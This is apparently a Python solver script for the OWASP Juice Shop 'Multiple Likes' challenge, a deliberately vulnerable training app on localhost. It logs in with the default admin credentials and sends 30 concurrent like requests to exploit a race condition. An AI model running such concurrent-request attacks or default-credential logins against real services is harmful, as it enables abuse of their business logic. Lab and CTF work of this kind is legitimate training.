
import requests
import concurrent.futures
import time

SERVER = 'http://localhost:3000'

def login(email, password):
    s = requests.Session()
    res = s.post(f'{SERVER}/rest/user/login', json={"email": email, "password": password})
    if res.ok:
        token = res.json().get('authentication', {}).get('token')
        s.headers.update({'Authorization': f'Bearer {token}'})
        return s
    return None

def like_review(session, review_id):
    try:
        # Endpoint for liking a review: POST /rest/products/reviews/{id}/like
        # Payload: none required usually, body can be empty.
        res = session.post(f'{SERVER}/rest/products/reviews/{review_id}/like', json={})
        return res.status_code, res.text
    except Exception as e:
        return 0, str(e)

def solve_multiple_likes():
    print("Solving 'Multiple Likes' Race Condition Challenge...")
    
    # 1. Login
    email = "admin@juice-sh.op"
    password = "admin123"
    session = login(email, password)
    if not session:
        print("Login failed.")
        return

    # 2. Get a valid review ID
    # If no reviews, create one.
    # First, list reviews: /rest/products/{id}/reviews. Need a product ID.
    # Let's just create a review for Product 1 (Apple Juice).
    product_id = 1
    review_payload = {"message": "Great juice!", "author": email}
    # Note: Create review is PUT /rest/products/{id}/reviews
    session.put(f'{SERVER}/rest/products/{product_id}/reviews', json=review_payload)
    
    # Now get the review ID
    res = session.get(f'{SERVER}/rest/products/{product_id}/reviews')
    if not res.ok:
        print("Failed to get reviews.")
        return
    
    reviews = res.json().get('data', [])
    if not reviews:
        print("No reviews found.")
        return
    
    # Pick the last review (most likely ours)
    target_review = reviews[-1]

    # Inspect review object
    print(f"Review Object Sample: {target_review}")
    review_id = target_review.get('_id')
    # 3. Race Condition Attack
    # Endpoint confirmed from source: POST /rest/products/reviews
    # Payload: { "id": review_id }
    
    url = f'{SERVER}/rest/products/reviews'
    payload = {'id': review_id}
    
    # Extract token for multi-session attack
    token = session.headers.get('Authorization').split(' ')[1]
    
    print(f"Launching Race Condition attack (30 concurrent requests) to {url} with separate sessions...")
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=30) as executor:
        # Pass token, not session
        futures = [executor.submit(like_review_url_new_session, token, url, payload) for _ in range(30)]
        
        success_count = 0
        for future in concurrent.futures.as_completed(futures):
            status, text = future.result()
            print(f"Result: {status}")
            if status != 200:
                 # print(f"Error Body: {text[:200]}") 
                 pass
            else:
                 success_count += 1
                 
        print(f"Total successful reqs: {success_count}")

def like_review_url_new_session(token, url, payload):
    try:
        s = requests.Session()
        s.headers.update({'Authorization': f'Bearer {token}'})
        # Try to synchronize send?
        # Just send immediately
        res = s.post(url, json=payload)
        return res.status_code, res.text
    except Exception as e:
        return 0, str(e)

if __name__ == '__main__':
    solve_multiple_likes()
